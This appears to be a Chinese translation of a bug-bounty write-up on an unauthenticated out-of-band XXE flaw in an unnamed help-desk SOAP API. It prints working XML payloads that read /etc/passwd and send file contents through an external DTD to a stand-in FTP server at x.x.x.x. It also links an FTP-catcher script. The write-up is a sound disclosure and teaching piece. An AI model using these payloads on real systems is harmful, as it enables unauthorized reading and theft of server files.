<html>
<head>
<title>SOAP- Based Unauthenticated Out-of-Band XML External Entity (OOB-XXE) in a Help Desk Software</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">帮助台软件中基于SOAP的未经验证的带外XML外部实体(OOB-XXE)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/soap-based-unauthenticated-out-of-band-xml-external-entity-oob-xxe-in-a-help-desk-software-c27a6abf182a?source=collection_archive---------0-----------------------#2018-10-24">https://infosecwriteups.com/soap-based-unauthenticated-out-of-band-xml-external-entity-oob-xxe-in-a-help-desk-software-c27a6abf182a?source=collection_archive---------0-----------------------#2018-10-24</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="835b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我省略了应用程序的名称，因为它是私有程序。</p><p id="2444" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注册应用程序时，我得到了wsdl文件，如:</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="782b" class="ku kv iq kq b gy kw kx l ky kz">https://victim.com/services/ApiService?wsdl</span></pre><p id="105d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我已经使用wsdler burp扩展来解析wsdl文件，如下图所示:</p><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi la"><img src="../Images/75e7b7f10d1f045cb2af97a8114b948f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2_g22ZlrkPBIMpC-uVJhdw.jpeg"/></div></div></figure><p id="cb9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我向中继器发出请求，并开始为XXE模糊它。首先，我从经典的XXE有效载荷开始，例如:</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="6075" class="ku kv iq kq b gy kw kx l ky kz">&lt;?xml version=”1.0"?&gt;</span><span id="6de9" class="ku kv iq kq b gy li kx l ky kz">&lt;!DOCTYPE data [</span><span id="0464" class="ku kv iq kq b gy li kx l ky kz">&lt;!ELEMENT data (#ANY)&gt;</span><span id="b3ef" class="ku kv iq kq b gy li kx l ky kz">&lt;!ENTITY file SYSTEM “file:///etc/passwd”&gt;]&gt;</span><span id="e9fd" class="ku kv iq kq b gy li kx l ky kz">&lt;data&gt;&amp;file;&lt;/data&gt;</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi lj"><img src="../Images/f48134bae856c7f8c03ec11a43643332.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rqgR6uk5iyJDhpR1n2IAeA.jpeg"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">对于文件/etc/passwd</figcaption></figure><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi lo"><img src="../Images/37e347704e95fb2f86886cab043de53c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AejVzEMWnfan1c5CMGVB1Q.jpeg"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">对于文件/etc/shadow</figcaption></figure><p id="ced5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如你所看到的，从上面两个响应我们可以确认漏洞的存在，但我们只能列举来自服务器的文件。</p><p id="126c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了提取文件的内容，我们需要<strong class="jp ir">模拟FTP </strong> - <strong class="jp ir">服务器(或者如果您使用了不同的服务器，请评论:)</strong></p><p id="58be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在服务器上设置了一个xxe.dtd文件，其有效负载如下:</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="6bf4" class="ku kv iq kq b gy kw kx l ky kz">&lt;!ENTITY % d SYSTEM “file:///etc/passwd”&gt;</span><span id="3b1d" class="ku kv iq kq b gy li kx l ky kz">&lt;!ENTITY % c “&lt;!ENTITY rrr SYSTEM ‘ftp://x.x.x.x:2121/%d;'&gt;"&gt;</span></pre><p id="27ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从以下链接下载并运行仿真ftp服务器(确保监听端口):</p><div class="lp lq gp gr lr ls"><a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb" rel="noopener  ugc nofollow" target="_blank"><div class="lt ab fo"><div class="lu ab lv cl cj lw"><h2 class="bd ir gy z fp lx fr fs ly fu fw ip bi translated">ONsec-实验室/脚本</h2><div class="lz l"><h3 class="bd b gy z fp lx fr fs ly fu fw dk translated">Utils。在GitHub上创建一个帐户，为ONsec-Lab/scripts开发做贡献。</h3></div><div class="ma l"><p class="bd b dl z fp lx fr fs ly fu fw dk translated">github.com</p></div></div><div class="mb l"><div class="mc l md me mf mb mg lg ls"/></div></div></a></div><p id="371f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们需要在易受攻击的请求中输入以下XXE有效负载，例如:</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="16ad" class="ku kv iq kq b gy kw kx l ky kz">&lt;!DOCTYPE a [ &lt;!ENTITY % asd SYSTEM "http://x.x.x.x/xxe.dtd"&gt; %asd; %c;]&gt; &lt;sessionId&gt;&amp;rrr;&lt;/sessionId&gt;</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi mh"><img src="../Images/35694578da50708c35eea14a61059e28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BlEduM6y9k8g_Uip1TCBHQ.jpeg"/></div></div><figcaption class="lk ll gj gh gi lm ln bd b be z dk translated">最终XXE有效载荷</figcaption></figure><p id="dcce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦运行易受攻击的请求，您将开始在仿真FTP服务器上接收/etc/passwd文件的内容，如下面的屏幕截图所示:</p><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi mi"><img src="../Images/64c1d4a89124a1f1c103b27d51335ec4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mU69xFKs23wG5jUwXuEoxA.jpeg"/></div></div></figure></div><div class="ab cl mj mk hu ml" role="separator"><span class="mm bw bk mn mo mp"/><span class="mm bw bk mn mo mp"/><span class="mm bw bk mn mo"/></div><div class="ij ik il im in"><p id="d77f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">参考资料:</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="d413" class="ku kv iq kq b gy kw kx l ky kz"><a class="ae mq" href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html?m=1" rel="noopener ugc nofollow" target="_blank">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html?m=1</a></span><span id="26c5" class="ku kv iq kq b gy li kx l ky kz"><a class="ae mq" href="https://gist.github.com/staaldraad/01415b990939494879b4" rel="noopener ugc nofollow" target="_blank">https://gist.github.com/staaldraad/01415b990939494879b4</a>`</span></pre></div></div>    
</body>
</html>